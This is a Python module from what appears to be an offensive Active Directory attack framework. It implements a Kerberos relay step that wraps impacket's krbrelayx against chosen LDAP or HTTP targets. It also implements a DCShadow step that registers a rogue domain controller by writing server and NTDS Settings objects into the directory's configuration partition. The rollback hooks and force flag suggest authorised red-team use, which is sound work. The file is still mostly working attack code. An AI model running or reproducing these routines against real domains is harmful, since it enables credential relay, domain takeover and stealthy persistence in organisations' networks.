"""Kerberos relay and DCShadow rogue-DC registration."""

from __future__ import annotations

import shutil
import subprocess
from typing import Any

from rich.console import Console

from adaf_attack.capabilities.planned_offensive import register_from_catalog
from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.ldap_ops import (
    attr_value,
    finish,
    lookup_sam,
    register_advisory_rollback,
    register_object_rollback,
    require_force,
    require_param,
)
from adaf_attack.core.ldap_util import ldap_connect
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()


@register_from_catalog("krb-relay")
class KrbRelay:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_force("krb-relay", force)
        relay_targets = kwargs.get("relay_targets") or kwargs.get("target")
        if isinstance(relay_targets, str):
            relay_targets = [h.strip() for h in relay_targets.split(",") if h.strip()]
        if not relay_targets:
            raise RuntimeError("krb-relay requires -P relay_targets=<ldap://host or http://host>")
        duration = int(kwargs.get("duration_seconds") or 60)
        binary = shutil.which("impacket-krbrelayx") or shutil.which("krbrelayx.py")
        if not binary:
            raise RuntimeError(
                "impacket-krbrelayx not on PATH; install with pip install 'adaf-attack[kerberos]'."
            )
        argv = [binary, "-t", str(relay_targets[0])]
        for extra in relay_targets[1:]:
            argv.extend(["-t", extra])
        log_file = session.path("krb-relay.log")
        with log_file.open("w", encoding="utf-8", newline="\n") as fp:
            proc = subprocess.Popen(
                argv, stdout=fp, stderr=subprocess.STDOUT, cwd=str(session.root)
            )
            try:
                proc.wait(timeout=duration)
                returncode = proc.returncode
                truncated = False
            except subprocess.TimeoutExpired:
                proc.terminate()
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()
                returncode = proc.returncode if proc.returncode is not None else -1
                truncated = True
        register_advisory_rollback(
            session,
            kind="krb-relay",
            target=",".join(str(t) for t in relay_targets),
            rollback="Review LDAP/HTTP writes performed over Kerberos relay and revert them.",
        )
        result = {
            "ok": True,
            "argv": argv,
            "return_code": returncode,
            "truncated": truncated,
            "relay_targets": relay_targets,
            "log": str(log_file),
        }
        for host in relay_targets:
            graph.add_edge(
                f"RELAY@{str(host).upper()}",
                f"DOMAIN@{target.domain.upper()}",
                "KrbRelayTarget",
            )
        return finish(session, graph, "krb-relay", result, ok=True)


@register_from_catalog("dcshadow")
class DcShadow:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_force("dcshadow", force)
        computer = require_param(kwargs, "computer", "sam")
        site = str(kwargs.get("site") or "Default-First-Site-Name")
        conn, base_dn, config_nc = ldap_connect(target)
        try:
            config = config_nc or f"CN=Configuration,{base_dn}"
            found = lookup_sam(conn, base_dn, computer, ["distinguishedName", "dNSHostName"])
            if not found:
                raise RuntimeError(f"Computer not found: {computer}")
            computer_dn, entry = found
            dns = str(attr_value(entry, "dNSHostName") or computer)
            server_dn = f"CN={computer.rstrip('$')},CN=Servers,CN={site},CN=Sites,{config}"
            ntds_dn = f"CN=NTDS Settings,{server_dn}"
            server_ok = bool(
                conn.add(
                    server_dn,
                    attributes={
                        "objectClass": ["top", "server"],
                        "dNSHostName": dns,
                        "serverReference": computer_dn,
                    },
                )
            )
            ntds_ok = bool(
                conn.add(
                    ntds_dn,
                    attributes={
                        "objectClass": ["top", "applicationSettings", "nTDSDSA"],
                        "hasMasterNCs": [base_dn],
                        "options": 1,
                    },
                )
            )
            if server_ok:
                register_object_rollback(
                    session, target_dn=server_dn, rollback="Delete the rogue DC server object."
                )
            if ntds_ok:
                register_object_rollback(
                    session, target_dn=ntds_dn, rollback="Delete the rogue nTDSDSA object."
                )
            result = {
                "ok": bool(server_ok or ntds_ok),
                "server_dn": server_dn,
                "ntds_dn": ntds_dn,
                "server_ok": server_ok,
                "ntds_ok": ntds_ok,
                "ldap_result": str(conn.result),
            }
            console.print(f"[green]dcshadow[/green] server={server_ok} ntds={ntds_ok}")
            return finish(session, graph, "dcshadow", result, ok=result["ok"])
        finally:
            conn.unbind()
